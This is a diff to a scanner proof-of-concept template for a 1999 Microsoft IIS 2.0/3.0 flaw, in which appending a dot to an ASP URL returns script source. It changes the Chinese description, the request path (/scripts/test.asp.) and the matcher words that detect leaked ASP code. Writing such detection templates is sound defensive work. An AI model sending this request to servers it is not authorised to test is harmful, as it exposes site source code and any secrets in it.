@@ -1,6 +1,6 @@
 [info]
 author = "ave"
-description = "向 IIS 2.0/3.0 服务器请求 ASP 页面 URL 末尾附加点号，若响应返回 ASP 源码而非执行结果则存在漏洞"
+description = "验证 Microsoft IIS 2.0/3.0 是否存在追加点号脚本源代码泄露漏洞。攻击者通过在 ASP/scripts 文件 URL 后追加一个点号(.)，可绕过服务器脚本执行限制，直接获取脚本源代码。"
 id = "POC-AVE-1999-0006"
 name = "Microsoft IIS 2.0/3.0 Appended Dot Script Source Disclosure PoC"
 severity = "medium"
@@ -15,16 +15,19 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/somefile.asp."
+path = "/{{BaseURL}}/scripts/test.asp."
 protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "<%@",
     "<%",
-    "RUNAT=SERVER",
-    "Scripting.FileSystemObject",
+    "language=",
+    "Response.",
 ]
